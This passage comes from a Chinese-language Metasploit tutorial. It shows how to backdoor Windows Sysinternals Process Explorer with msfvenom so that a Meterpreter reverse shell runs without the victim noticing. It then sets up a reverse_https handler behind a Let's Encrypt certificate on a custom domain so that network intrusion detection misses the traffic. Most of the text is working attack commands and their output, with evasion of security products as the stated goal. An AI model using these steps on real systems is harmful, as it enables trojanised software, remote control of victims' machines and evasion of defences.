  [*] Sending stage (37543 bytes) to 192.168.216.5\n[*] Meterpreter session 1 opened\
  \ (192.168.216.5:4444\n-> 192.168.216.5:40720) at 2017-12-17 05:43:06 -0500\n\n\
  meterpreter >\n```\n\n## 模板\n\n后门已知应用程序可以成为入侵目标的一种良好方式，例如，当你已经在内部网络上并获得了对内部软件仓库的访问权限时。此外，通过使用自定义模板，你可能能够绕过一些使用默认模板来检测\
  \ Metasploit 有效载荷的安全解决方案。\n\n### 准备工作\n\nMSFvenom 默认使用 /usr/share/metasploit-framework/data/templates\
  \ 目录中的模板，但我们可以使用 -x 选项选择使用自己的模板。\n\n### 如何操作...\n\n- 1. 使用 -x 选项，我们可以指定自己的模板；在本教程中我们将使用\
  \ Windows Sysinternals 的 Process Explorer，并且通过使用 -k 选项，可以将你的有效载荷作为模板的新线程运行：\n```\n\
  root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.216.5 -x\
  \ procexp.exe -k -f exe -o procexp-backdoored.exe\nNo platform was selected, choosing\
  \ Msf::Module::Platform::Windows from the payload\nNo Arch selected, selecting Arch:\
  \ x86 from the payload\nNo encoder or badchars specified, outputting raw payload\n\
  Payload size: 333 bytes\nFinal size of exe file: 4440576 bytes\n```\n```\nSaved\
  \ as: procexp-backdoored.exe\nroot@kali:~#\n```\n- 2. 当受害者运行有效载荷时，他们不会意识到该应用程序已被植入后门：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_615_0.png)\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_615_1.png)\n\
  \n创建 x64 有效载荷并使用自定义 x64 模板时，应使用 exe-only 作为输出格式，而不是 exe。\n\n## 使用受信任证书的 Meterpreter\
  \ 有效载荷\n\n大多数安全解决方案也会进行网络入侵检测，通过分析进出目标机器的流量。在这种情况下，最有可能的是，即使我们可以使用编码器来绕过防病毒软件，我们的有效载荷在尝试连接到我们的侦听器时仍会被捕获。\n\
  \n### 准备工作\n\n因为本教程使用有效的 TLS 证书，我使用了一台运行 Ubuntu 16、内存为 1 GB 的 DigitalOcean Droplet。配置一个自定义域名\
  \ zinitiative.com，并使用 Let’s Encrypt 获取证书。\n\n### 如何操作...\n\n在将域名的 DNS 服务器配置为指向 DigitalOcean\
  \ Droplet 之后，使用 Let’s Encrypt 获取证书非常简单。\n\n- 1. 首先，我们需要安装 letsencrypt，可以使用以下命令完成：\n\
  ```\napt install letsencrypt -y\n```\n- 2. 接下来，运行 letsencrypt 命令生成证书，并按照说明操作：\n\
  ```\nletsencrypt certonly --manual -d zinitiative.com\n```\n- 3. 如果一切按预期进行，你应该在\
  \ /etc/letsencrypt/live/zinitiative.com 目录下拥有你的证书：\n```\nroot@Metasploit:~# ls /etc/letsencrypt/live/zinitiative.com\n\
  cert.pem chain.pem fullchain.pem privkey.pem\n```\n- 4. 但在继续之前，我们必须创建一个包含 `privkey.pem`\
  \ 和 `cert.pem` 的统一文件；为此我们将使用 `cat` 命令，如下所示：\n```\nroot@Metasploit:~# cd /etc/letsencrypt/live/zinitiative.com/\n\
  root@Metasploit:/etc/letsencrypt/live/zinitiative.com# cat privkey.pem cert.pem\
  \ >> /root/unified.pem\nroot@Metasploit:/etc/letsencrypt/live/zinitiative.com#\n\
  ```\n- 5. 要安装 Metasploit，请使用 Linux 和 macOS 快速安装脚本：\n```\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb\
  \ > msfinstall && \\\nchmod 755 msfinstall && \\\n./msfinstall\n```\n- 6. 现在我们拥有所需的一切，可以使用\
  \ `HandlerSSLCert` 选项设置我们的侦听器以使用受信任的证书，证书路径为统一的 PEM 格式。为了在 Meterpreter 中启用证书验证，我们将\
  \ `StagerVerifySSLCert` 设置为 `true`，并将 `EnableStageEncoding` 设置为对第二阶段有效载荷进行编码，从而帮助我们绕过多个安全解决方案：\n\
  ```\nroot@Metasploit:~# msfconsole -q\nmsf > use exploit/multi/handler\nmsf exploit(multi/handler)\
  \ > set PAYLOAD windows/meterpreter/reverse_https\nPAYLOAD => windows/meterpreter/reverse_https\n\
  msf exploit(multi/handler) > set LHOST zinitiative.com\nLHOST => zinitiative.com\n\
  msf exploit(multi/handler) > set LPORT 443\nLPORT => 443\nmsf exploit(multi/handler)\
